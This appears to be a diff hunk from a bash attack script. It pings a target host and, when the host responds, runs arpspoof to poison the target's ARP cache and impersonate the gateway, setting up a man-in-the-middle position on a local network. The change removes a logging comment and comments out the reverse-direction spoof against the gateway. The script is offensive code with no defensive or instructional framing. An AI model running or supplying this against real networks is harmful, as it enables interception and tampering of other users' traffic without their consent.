@@ -7,9 +7,8 @@ echo "${TARGET}"
     ping -c 1 -t 1 ${TARGET} > /dev/null 2> /dev/null  # ping and discard output
     if [ $? -eq 0 ]; then  # check the exit code
         echo "${TARGET} is up; Starting ARPspoof" # display the output
-        # you could send this to a log file by using the >>pinglog.txt redirect
 	arpspoof -i ${INT} -t ${TARGET} ${gateway} &
- 	arpspoof -i ${INT} -t ${gateway} ${TARGET} &
+ 	#arpspoof -i ${INT} -t ${gateway} ${TARGET} &
     else
         echo "${TARGET} is down"
     fi
